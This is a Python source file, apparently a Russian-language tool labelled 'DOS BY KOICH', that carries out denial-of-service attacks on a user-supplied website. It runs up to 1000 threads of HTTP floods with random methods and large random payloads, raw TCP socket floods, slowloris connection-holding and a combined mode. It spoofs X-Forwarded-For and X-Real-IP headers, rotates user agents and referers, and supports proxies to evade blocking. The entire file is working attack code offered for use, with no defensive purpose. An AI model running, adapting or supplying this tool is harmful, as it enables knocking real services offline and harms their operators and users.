

import sys
import threading
import time
import random
import socket
import ssl
from urllib.parse import urlparse
from queue import Queue
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import concurrent.futures


THREAD_ACTIVE = []
STOP_FLAG = threading.Event()
STATS_LOCK = threading.Lock()
REQUEST_COUNT = 0
ERROR_COUNT = 0
BYTES_SENT = 0

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 YaBrowser/24.4.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36'
]

REFERERS = [
    'https://google.com/',
    'https://bing.com/',
    'https://yandex.ru/',
    'https://duckduckgo.com/',
    'https://facebook.com/',
    'https://twitter.com/',
    'https://linkedin.com/',
    'https://reddit.com/'
]


def random_payload(min_size=512, max_size=8192):
    size = random.randint(min_size, max_size)
    return bytes([random.randint(0, 255) for _ in range(size)])


class SocketDoser:
    def __init__(self, host, port, use_ssl=False):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        
    def slowloris_attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))
            
            if self.use_ssl:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            
            partial_headers = [
                f"GET /{random.randint(1,999999)} HTTP/1.1\r\n",
                f"Host: {self.host}\r\n",
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n",
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                f"Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\n",
                f"Accept-Encoding: gzip, deflate\r\n",
                f"Connection: keep-alive\r\n",
                f"X-Custom-Header: {random.randint(1, 999999)}\r\n"
            ]
            
            for header in partial_headers:
                sock.send(header.encode())
                time.sleep(random.uniform(0.5, 2))
            
            # Держим соединение открытым
            while not STOP_FLAG.is_set():
                sock.send(f"X-Keep-Alive: {random.randint(1, 99999)}\r\n".encode())
                time.sleep(random.uniform(10, 60))
                
        except Exception as e:
            pass
        finally:
            try:
                sock.close()
            except:
                pass


def http_worker(url, thread_id, proxy_list=None):
    global REQUEST_COUNT, ERROR_COUNT, BYTES_SENT
    
    session = requests.Session()
    
    
    retry_strategy = Retry(
        total=0,
        backoff_factor=0,
        status_forcelist=[],
        allowed_methods=["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]
    )
    adapter = HTTPAdapter(
        pool_connections=500,
        pool_maxsize=500,
        max_retries=retry_strategy,
        pool_block=False
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    
    session.verify = False
    requests.packages.urllib3.disable_warnings()
    
    # Прокси если есть
    if proxy_list:
        proxy = random.choice(proxy_list)
        session.proxies.update({
            'http': proxy,
            'https': proxy
        })
    
    methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH']
    
    while not STOP_FLAG.is_set():
        try:
            method = random.choice(methods)
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': '*/*',
                'Accept-Language': 'ru-RU,ru;q=0.9,*;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Referer': random.choice(REFERERS),
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            
            
            random_path = f"/{random.randint(1000000,9999999)}?id={random.randint(1,999999)}&cache={random.random()}"
            parsed = urlparse(url)
            target = f"{parsed.scheme}://{parsed.netloc}{random_path}"
            
            start_time = time.time()
            
            if method in ['POST', 'PUT', 'PATCH']:
                payload_size = random.randint(1024, 65536)
                data = random_payload(payload_size)
                response = session.request(
                    method=method,
                    url=target,
                    headers=headers,
                    data=data,
                    timeout=random.uniform(2, 8),
                    stream=False
                )
                BYTES_SENT += len(data)
            else:
                response = session.request(
                    method=method,
                    url=target,
                    headers=headers,
                    timeout=random.uniform(2, 5),
                    stream=False
                )
            
            response_time = time.time() - start_time
            
            
            _ = response.content
            BYTES_SENT += len(response.content)
            
            with STATS_LOCK:
                REQUEST_COUNT += 1
            
           
            time.sleep(random.uniform(0.01, 0.1))
            
        except requests.exceptions.Timeout:
            with STATS_LOCK:
                ERROR_COUNT += 1
        except requests.exceptions.ConnectionError:
            with STATS_LOCK:
                ERROR_COUNT += 1
        except Exception:
            with STATS_LOCK:
                ERROR_COUNT += 1


def sync_socket_worker(host, port, use_ssl, thread_id):
    global REQUEST_COUNT, ERROR_COUNT, BYTES_SENT
    
    while not STOP_FLAG.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            
            random_uri = f"/{random.randint(100000, 999999)}?r={random.random()}&t={int(time.time())}"
            
            request = (
                f"GET {random_uri} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n"
                f"X-Random: {random.randint(1, 999999)}\r\n"
                f"\r\n"
            )
            
            sock.send(request.encode())
            BYTES_SENT += len(request)
            
            
            try:
                response = sock.recv(4096)
                BYTES_SENT += len(response)
            except:
                pass
            
            sock.close()
            
            with STATS_LOCK:
                REQUEST_COUNT += 1
            
            time.sleep(random.uniform(0.001, 0.05))
            
        except socket.timeout:
            with STATS_LOCK:
                ERROR_COUNT += 1
        except Exception:
            with STATS_LOCK:
                ERROR_COUNT += 1
        finally:
            try:
                sock.close()
            except:
                pass


def combo_worker(url, thread_id, proxy_list=None):
    global REQUEST_COUNT, ERROR_COUNT, BYTES_SENT
    
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    use_ssl = parsed.scheme == 'https'
    
    session = None
    if not use_ssl:
        try:
            session = requests.Session()
            session.verify = False
            requests.packages.urllib3.disable_warnings()
        except:
            pass
    
    attack_mode = 0  # 0 = http, 1 = socket, 2 = slowloris
    
    while not STOP_FLAG.is_set():
        try:
            attack_mode = (attack_mode + 1) % 3
            
            if attack_mode == 0 and session:
                # HTTP метод
                method = random.choice(['GET', 'POST', 'HEAD'])
                random_path = f"/{random.randint(1000000,9999999)}"
                target = f"{parsed.scheme}://{parsed.netloc}{random_path}"
                
                headers = {'User-Agent': random.choice(USER_AGENTS)}
                
                if method == 'POST':
                    data = random_payload(4096)
                    resp = session.post(target, headers=headers, data=data, timeout=3)
                    BYTES_SENT += len(data)
                else:
                    resp = session.get(target, headers=headers, timeout=3)
                
                BYTES_SENT += len(resp.content)
                
            elif attack_mode == 1:
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((host, port))
                
                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)
                
                req = f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\n\r\n"
                sock.send(req.encode())
                BYTES_SENT += len(req)
                sock.close()
                
            else:
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                
                if use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=host)
                
                sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode())
                
                time.sleep(1)
                sock.close()
            
            with STATS_LOCK:
                REQUEST_COUNT += 1
                
        except Exception:
            with STATS_LOCK:
                ERROR_COUNT += 1
            time.sleep(0.1)


def dos_attack(target_url, thread_count=100, use_proxies=False, attack_type='combo'):
    global REQUEST_COUNT, ERROR_COUNT, BYTES_SENT, STOP_FLAG
    
    
    REQUEST_COUNT = 0
    ERROR_COUNT = 0
    BYTES_SENT = 0
    STOP_FLAG.clear()
    
    print(f"\n[+] Цель: {target_url}")
    print(f"[+] Потоков: {thread_count}")
    print(f"[+] Тип: {attack_type}")
    print(f"[+] Прокси: {'да' if use_proxies else 'нет'}")
    print(f"[+] Статус: ЗАПУСК...\n")
    
    
    proxy_list = []
    if use_proxies:
        
        proxy_list = [
            'http://127.0.0.1:8080',  # УКАЖИ СВОЙ ПРОКСИ
            
        ]
    
    threads = []
    
    for i in range(thread_count):
        if attack_type == 'http':
            t = threading.Thread(target=http_worker, args=(target_url, i, proxy_list if proxy_list else None))
        elif attack_type == 'socket':
            parsed = urlparse(target_url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            use_ssl = parsed.scheme == 'https'
            t = threading.Thread(target=sync_socket_worker, args=(host, port, use_ssl, i))
        elif attack_type == 'slowloris':
            parsed = urlparse(target_url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            use_ssl = parsed.scheme == 'https'
            doser = SocketDoser(host, port, use_ssl)
            t = threading.Thread(target=doser.slowloris_attack)
        else:  # combo по умолчанию
            t = threading.Thread(target=combo_worker, args=(target_url, i, proxy_list if proxy_list else None))
        
        t.daemon = True
        threads.append(t)
        t.start()
        time.sleep(0.05)  
    
    
    try:
        while not STOP_FLAG.is_set():
            time.sleep(2)
            with STATS_LOCK:
                req_rate = REQUEST_COUNT / max(1, (time.time() - start_time))
                mb_sent = BYTES_SENT / (1024 * 1024)
                print(f"\r[+] Запросов: {REQUEST_COUNT} | Ошибок: {ERROR_COUNT} | {mb_sent:.2f} MB | {req_rate:.1f} r/s", end='')
    except KeyboardInterrupt:
        print("\n[+] Остановка по Ctrl+C")
        STOP_FLAG.set()


def main():
    print("DOS BY KOICH")
    print("=" * 50)
    
    target = input("\n[?] URL цели (http://example.com): ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    try:
        threads = int(input("[?] Количество потоков (1-1000): "))
        threads = max(1, min(1000, threads))
    except:
        threads = 100
    
    print("\n[?] Тип атаки:")
    print("    1 - HTTP (requests)")
    print("    2 - Socket (raw TCP)")
    print("    3 - Slowloris")
    print("    4 - Комбо (рекомендуется)")
    
    attack_type_map = {'1': 'http', '2': 'socket', '3': 'slowloris', '4': 'combo'}
    choice = input("[?] Выбор (1-4): ").strip()
    attack_type = attack_type_map.get(choice, 'combo')
    
    proxies = input("[?] Использовать прокси? (y/n): ").strip().lower() == 'y'
    
    print("\n" + "=" * 50)
    print("DOS BY KOICH — АКТИВИРОВАН")
    print("=" * 50)
    
    global start_time
    start_time = time.time()
    
    dos_attack(target, threads, proxies, attack_type)

if __name__ == "__main__":
    main()